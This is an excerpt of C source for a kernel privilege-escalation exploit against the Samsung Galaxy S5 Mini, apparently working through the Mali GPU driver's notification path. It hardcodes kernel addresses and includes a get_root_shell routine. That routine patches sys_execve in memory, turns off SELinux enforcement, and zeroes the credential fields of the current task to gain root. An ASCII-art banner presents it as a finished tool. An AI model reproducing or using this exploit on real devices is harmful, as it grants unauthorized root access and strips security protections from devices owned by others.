...
// target stuff
#define TARGET_KERNEL_VA   0xc0740e44	// what we wanna write (not used)
#define TARGET_PHYS_ADDR   0x80740000   // page-aligned physical address
#define TARGET_PAGE_OFFSET 0xa54        // offset within page we wanna write

//useful addresses
#define ENFORCING_ADDR	   0xc0bc1288
#define COMMIT_CREDS	   0xc005a290
#define PREPARE_KERNEL_CRED 0xc005aa60
...
void get_root_shell() {
    // Patch sys_execve: sec_restrict_fork is inlined and sets r10=1 to block
    // execve when a uid 0 process has a non-root parent. Change to r10=0.
    uint32_t* mov_instr = (uint32_t*)0xc0012474;
    *mov_instr = 0xE3A0A000;  // MOV r10,#0x0 (was MOV r10,#0x1)

    // Zero SELinux enforcing flag directly in kernel memory
    uint32_t* enforcing = (uint32_t*)ENFORCING_ADDR;
    *enforcing = 0;

    // Get current task_struct via thread_info
    uint32_t sp;
    asm("mov %0, sp" : "=r"(sp));
    uint32_t current_task = *(uint32_t*)((sp & ~(8192 - 1)) + 0xc);
    ...
    // Use current instead of NULL to avoid init_user path which caused a hang
    struct cred* new_cred = prepare_kernel_cred((void*)current_task);

    // Zero uid/gid fields — skip [0] (refcount) to avoid breaking lifetime shi
    // [1]=uid [2]=gid [3]=suid [4]=sgid [5]=euid [6]=egid [7]=fsuid [8]=fsgid
    uint32_t* c = (uint32_t*)new_cred;
    c[1] = 0; c[2] = 0; c[3] = 0; c[4] = 0;
    c[5] = 0; c[6] = 0; c[7] = 0; c[8] = 0;

    // Replace current task credentials with our zeroed cred struct
...
void important_ascii_art() {
    ...
    printf("██   ██  ██████  ██   ██    ██    \n");
    printf("\033[0m");
	printf("\n\033[38;5;34m    Samsung Galaxy S5 Mini\033[0m\n\n");
}
...
int main(void)
{
	...
	if (notif.type == _MALI_NOTIFICATION_PP_FINISHED) {
		...
		const char *proc_path = "/proc/boot_stat";
